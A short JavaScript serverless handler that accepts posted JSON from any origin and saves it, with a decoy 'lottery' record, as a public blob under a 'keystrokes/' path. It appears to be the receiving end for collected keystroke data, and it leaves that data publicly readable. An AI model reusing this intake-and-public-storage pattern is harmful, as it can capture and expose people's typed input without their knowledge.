import { put } from "@vercel/blob";

/* 🔢 SIMPLE LOTTERY GENERATOR (JSON-SAFE) */
function generateLottery() {
  return {
    lotteryNumber: Math.floor(100000 + Math.random() * 900000), // 6-digit
    isWinner: Math.random() < 0.1, // 10% chance
    generatedAt: new Date().toISOString()
  };
}

export const config = {
  api: {
    bodyParser: true
  }
};

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  try {
    const data = req.body;

    if (!data || !data.username) {
      return res.status(400).json({ error: "Username required" });
    }

    /* 🎟️ LOTTERY DATA (ONLY FOR BLOB) */
    const lottery = generateLottery();

    const filename = `keystrokes/${data.username}_${Date.now()}.json`;

    const blob = await put(
      filename,
      JSON.stringify(
        {
          ...data,
          lottery   // 👈 saved ONLY in blob
        },
        null,
        2
      ),
      {
        access: "public",
        contentType: "application/json"
      }
    );

    return res.status(200).json({
      success: true,
      url: blob.url
      // ⛔ no lottery logic returned if you don't want
    });

  } catch (err) {
    console.error("SERVER ERROR:", err);
    return res.status(500).json({ error: "Server error" });
  }
}
